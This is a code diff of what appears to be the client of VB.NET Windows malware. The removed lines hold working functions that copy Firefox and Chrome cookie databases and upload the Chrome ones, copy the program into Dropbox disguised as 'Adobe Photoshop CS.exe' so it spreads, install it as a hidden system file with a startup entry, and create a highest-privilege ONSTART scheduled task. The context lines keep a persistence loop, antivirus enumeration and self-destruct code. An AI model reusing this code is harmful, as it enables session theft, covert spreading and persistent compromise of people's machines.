@@ -123,7 +123,7 @@ Public Class Form1
             End If
 
             If DropBoxSpreadd = "True" Then
-                DropBoxSpread()
+                SpreadFile()
             End If
 
             If HardInstall = "True" Then
@@ -143,7 +143,7 @@ Public Class Form1
             End If
 
             If ASchtask = "True" Then
-                SchTask()
+                AddtoSchTask()
             End If
 
             If WatcherStatus = "True" Then
@@ -183,39 +183,6 @@ Public Class Form1
 
         End Try
     End Sub
-    Public Sub Install_Server()
-        Try
-            Dim DropPath As String = Environ(PathS) & "\Microsoft\MyClient\"
-            If Not (Directory.Exists(DropPath)) Then
-                Directory.CreateDirectory(DropPath)
-            End If
-            If File.Exists(DropPath & InstallName) Then
-                File.Delete(DropPath & InstallName)
-            End If
-            Melt(DropPath & InstallName)
-        Catch ex As Exception
-
-        End Try
-    End Sub
-    Public Sub Melt(filename As String)
-        Try
-            File.Copy(Application.ExecutablePath, filename, True)
-            File.SetAttributes(filename, FileAttributes.System + FileAttributes.Hidden)
-            AStartup(StartName, filename)
-        Catch ex As Exception
-
-        End Try
-    End Sub
-    Public Function RSA_Decrypt(ByVal Input As String, ByVal Key As String) As String
-        Dim plain As Byte()
-        Using rsa As RSACryptoServiceProvider = New RSACryptoServiceProvider(2048)
-            rsa.PersistKeyInCsp = False
-            rsa.FromXmlString(Key)
-            Dim buffer As Byte() = Convert.FromBase64String(Input)
-            plain = rsa.Decrypt(buffer, True)
-        End Using
-        Return System.Text.Encoding.UTF8.GetString(plain)
-    End Function
 
     Public Function checkBlacklist() As Boolean
         Return My.Settings.blacklist
@@ -493,60 +460,12 @@ Public Class Form1
             Return "no"
         End If
     End Function
-    Public Function StealFFCookies()
-        Try
-            Dim directories As String() = Directory.GetDirectories("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles")
-            Dim i As Integer = 0
-            While i < directories.Length
-                Dim text2 As String = directories(i)
-                Dim flag As Boolean = File.Exists("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles" + text2.Replace("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles", String.Empty) + "\cookies.sqlite")
-                If flag Then
-                    Dim name As String = text2.Replace("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles", String.Empty)
-                    File.Copy("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles\" + name + "\cookies.sqlite", TempPath & "\" & "cookies.sqlite", True)
-                End If
-                i = i + 1
-            End While
-            Return True
-        Catch ex As Exception
-            Return False
-        End Try
-    End Function
-    Public Function StealChromeCookies()
-        Try
-            Dim chromeData As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) & "\Google\Chrome\User Data\Default\"
-            If File.Exists(chromeData & "Cookies") Then
-                File.Copy(chromeData & "Cookies", TempPath & "\" & "CookiesCh.sqlite")
-                C.Upload(TempPath & "\" & "CookiesCh.sqlite")
-            End If
-            Return True
-        Catch ex As Exception
-            Return False
-        End Try
-    End Function
-    Public Function DropBoxSpread()
-        Try
-            If Not File.Exists(GetDropbox() & "\" & "Adobe Photoshop CS.exe") Then
-                File.Copy(Application.ExecutablePath, GetDropbox() & "\" & "Adobe Photoshop CS.exe", True)
-            End If
-            Return True
-        Catch ex As Exception
-            Return False
-        End Try
-    End Function
     Public Function GetLocation() As String
         Dim res As String = Assembly.GetExecutingAssembly().Location
         If res = "" OrElse res Is Nothing Then
             res = Assembly.GetEntryAssembly().Location
         End If
         Return res
-    End Function
-    Public Function GetDropbox()
-        Dim DropboxFolder = Environment.GetEnvironmentVariable("USERPROFILE") & "\Dropbox"
-        If Not (Directory.Exists(DropboxFolder)) Then
-            Return "None"
-        Else
-            Return DropboxFolder
-        End If
     End Function
     Public Sub SelfDestroy()
         Dim si As ProcessStartInfo = New ProcessStartInfo()
@@ -612,27 +531,7 @@ Public Class Form1
             Return ex.Message
         End Try
     End Function
-    Function SchTask()
-        Try
-            Dim installfullpath As FileInfo
-            If HardInstall = "True" Then
-                installfullpath = New FileInfo(Path.Combine(Environ(PathS), InstallName))
-            Else
-                installfullpath = New FileInfo(Application.ExecutablePath)
-            End If
-            Dim pi As New ProcessStartInfo
-            With pi
-                .FileName = "schtasks.exe"
-                .Arguments = "/create /f /sc ONSTART /RL HIGHEST /tn " + """'" + Path.GetFileNameWithoutExtension(installfullpath.FullName) + """'" + " /tr " + """'" + installfullpath.FullName + """'"
-                .WindowStyle = ProcessWindowStyle.Hidden
-                .CreateNoWindow = True
-            End With
-            Process.Start(pi)
-            Return True
-        Catch ex As Exception
-            Return False
-        End Try
-    End Function
+
     Function GetAntiVirus() As String
         Try
             Dim str As String = Nothing
@@ -713,7 +612,6 @@ re:
     End Function
     Public Sub StartWork(ByVal x As Boolean)
         Do While x = True
-            Thread.Sleep(5000)
             AStartup(StartName, Application.ExecutablePath)
         Loop
     End Sub
